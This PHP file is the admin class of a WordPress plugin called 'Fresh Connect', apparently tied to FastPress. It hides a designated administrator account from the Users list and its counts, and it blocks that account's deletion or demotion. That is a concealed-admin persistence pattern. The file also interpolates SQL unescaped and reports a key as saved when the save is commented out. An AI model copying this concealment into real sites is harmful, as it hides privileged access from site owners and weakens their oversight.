<?php
/**
 * Class Fresh_Connect_Admin.
 */
class Fresh_Connect_Admin {
	
	private $plugin_file;
	
    /**
     * Constructor
     */
    public function __construct() {
		$this->plugin_file = FRESH_CONNECT_PLUGIN_FILE_PATH;
		$this->success_notice = 'notice notice-success is-dismissible';
		$this->warning_notice = 'notice notice-warning is-dismissible';
		$this->error_notice = 'notice notice-error is-dismissible';
		
        add_action( "admin_enqueue_scripts", array( $this, 'enqueue_styles' ) );
		add_action( "admin_enqueue_scripts", array( $this, 'enqueue_scripts' ) );
		
		add_action( "admin_menu", array( $this, 'fresh_admin_menu' ) );
		add_action( "admin_footer", array( $this, 'fresh_admin_footer' ) );
        add_action( 'admin_notices', array( $this, 'fresh_admin_notices' ) );
		
		add_action( "pre_user_query", array( $this, 'fresh_pre_user_query' ) );
		add_action( "delete_user", array( $this, 'fresh_delete_user' ) );
		add_action( "set_user_role", array( $this, 'fresh_set_user_role' ), 10, 3 );
		
		add_filter( "views_users", array( $this, 'fresh_views_users' ) );
		add_filter( "user_row_actions", array( $this, 'fresh_user_row_actions' ), 10, 2 );
		add_filter( "plugin_action_links_{$this->plugin_file}", array( $this, 'fresh_action_links' ) );
		add_filter( "plugin_row_meta", array( $this, 'fresh_row_meta' ), 10, 4 );
    }
 
    public function enqueue_styles() {
        wp_enqueue_style( 'fp-admin-css', FRESH_CONNECT_URL_PATH . 'assets/css/fp-admin.css', array(), '1.0', 'all' );
    }
	
    public function enqueue_scripts() {
        wp_enqueue_script('fp-deactivation-js', FRESH_CONNECT_URL_PATH . 'assets/js/fp-admin.js', array(), '1.0', false );
		wp_localize_script('fp-deactivation-js', 'fcAjaxObj', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ));
    }
	
	public function fresh_admin_menu() {
		add_menu_page( __( 'Fresh Connect', FRESH_TEXT_DOMAIN ), 'Fresh Connect', 'manage_options', 'fresh-connect-aboutus', array($this, 'main_menu_page'), 'dashicons-menu', 4 ); 
		add_submenu_page( 'fresh-connect-aboutus', 'Fresh Connect', 'Connection Status', 'manage_options', 'fresh-connect-status', array($this, 'connection_status_page') );
	}
	
	public function main_menu_page() {
		include( FRESH_CONNECT_DIR_PATH . 'page/main-page.php' );
	}
	
	public function connection_status_page() {
        $fastpress_status = get_option('fp_status');
        if( isset($_POST['fc_key']) ) {
            $key = trim($_POST['fc_key']);
            $length = strlen($key);
            if($length < 32){
                $_REQUEST['action'] = 'errlength';
                $this->fresh_admin_notices();
            }else{
                //update_option('fp_connection_keys', $key);
                $_REQUEST['action'] = 'success';
                $this->fresh_admin_notices();
            }
        }
		include( FRESH_CONNECT_DIR_PATH . 'page/status.php' );
	}
	
	public function fresh_admin_footer() {
		include( FRESH_CONNECT_DIR_PATH . 'page/templates/display_deactivation_popup.php' );
	}
	
	public function fresh_pre_user_query( $user_search ) {
		$username = get_option('fp_main_username');
		
		if($username != ''){
			global $wpdb;
			$user_search->query_where = str_replace('WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != '$username'",$user_search->query_where);
		}
	}
	
	public function fresh_views_users( $views ) {
		$username = get_option('fp_main_username');
	
		if( username_exists( $username ) ){
			$users = count_users();
			$admins_num = $users['avail_roles']['administrator'] - 1;
			$all_num = $users['total_users'] - 1;
			$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
			$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
			$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
			$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
		}
		
		return $views;
	}
	
	public function fresh_user_row_actions( $actions, $user_obj ) {
		global $current_user;
		$username = get_option('fp_main_username');
		
		if ( in_array('administrator', $user_obj->roles) && $user_obj->user_login == $username ){
			$delete_url =
			add_query_arg(
				array(
					'action' => 'delete',
					'user' => $user_obj->ID,
					'_wpnonce' => wp_create_nonce( 'delete-user_' . $user_obj->ID )
				),
				admin_url( 'users.php' )
			);
			
			if( $current_user->user_login != $user_obj->user_login ){
				$actions["delete"] = '<a href="'.$delete_url.'" class="fc_delete_user_link">Delete</a>';
			}
		}
		
		return $actions;
	}
	
	public function fresh_delete_user( $user_id ) {
		$username = get_option('fp_main_username');
		$user_obj = get_userdata( $user_id );
		
		if( in_array('administrator', $user_obj->roles) && $user_obj->user_login == $username ){
			$url = add_query_arg(
						array('fcuser_delete' => '1'),
						admin_url( 'users.php' )
					);
			wp_redirect($url);
			die;
		}
	}
	
	public function fresh_action_links( $links ) {
		$aboutus_link = admin_url().'admin.php?page=fresh-connect-aboutus';
		$abt_link = '<a href="' . $aboutus_link . '">About Us</a>';
		array_unshift($links, $abt_link);
		
		$deactivate_url =
		add_query_arg(
			array(
				'action' => 'deactivate',
				'plugin' => FRESH_CONNECT_PLUGIN_FILE_PATH,
				'_wpnonce' => wp_create_nonce( 'deactivate-plugin_' . FRESH_CONNECT_PLUGIN_FILE_PATH )
			),
			admin_url( 'plugins.php' )
		);

		$links["deactivate"] = '<a href="'.$deactivate_url.'" class="fc_deactivate_link">Deactivate</a>';
		
		return $links;
	}
	
	public function fresh_row_meta( $links_array, $plugin_file_name, $plugin_data, $status ) {
		$support = FRESH_CONNECT_PLUGIN_URL . 'support';

		if( $plugin_file_name == $this->plugin_file ) {
			// you can still use array_unshift() to add links at the beginning
			$links_array[] = '<a href="' . $support . '" target="_blank">Support</a>';
		}
		
		return $links_array;
	}
	
	public function fresh_set_user_role( $user_id, $role, $old_roles ) {
		$username = get_option('fp_main_username');
		if(in_array('administrator', $old_roles)){
			$userdata = get_user_by('ID', $user_id);
			
			if($username == $userdata->user_login){
				$result = wp_update_user(array('ID' => $user_id, 'role' => 'administrator'));
				
				$url = add_query_arg(
							array('fcuser_role' => '1'),
							admin_url( 'users.php' )
						);
				wp_redirect($url);
				die;
			}
		}
	}
	
	public function fresh_admin_notices() {
		global $pagenow;
		
		if ( $pagenow == 'users.php' && isset($_REQUEST['fcuser_role']) ) {
			$message = __( 'It is not possible to change the role for this admin user as it is required for FastPress', FRESH_TEXT_DOMAIN );

			printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $this->warning_notice ), esc_html( $message ) ); 
		}
		
		if ( $pagenow == 'users.php' && isset($_REQUEST['fcuser_delete']) ) {
			$message = __( 'It is not possible to delete this admin user as it is required for FastPress', FRESH_TEXT_DOMAIN );

			printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $this->warning_notice ), esc_html( $message ) ); 
        }
        
        if ( $pagenow == 'admin.php' && isset($_REQUEST['action']) && $_REQUEST['action'] == 'errlength') {
			$message = __( 'Fresh connect key should be minimum 32 character long', FRESH_TEXT_DOMAIN );

			printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $this->error_notice ), esc_html( $message ) ); 
        }
        
        if ( $pagenow == 'admin.php' && isset($_REQUEST['action']) && $_REQUEST['action'] == 'success') {
			$message = __( 'Fresh connect key saved successfully', FRESH_TEXT_DOMAIN );

			printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $this->success_notice ), esc_html( $message ) ); 
		}
    }
    
}
 
$freshclassobj = new Fresh_Connect_Admin();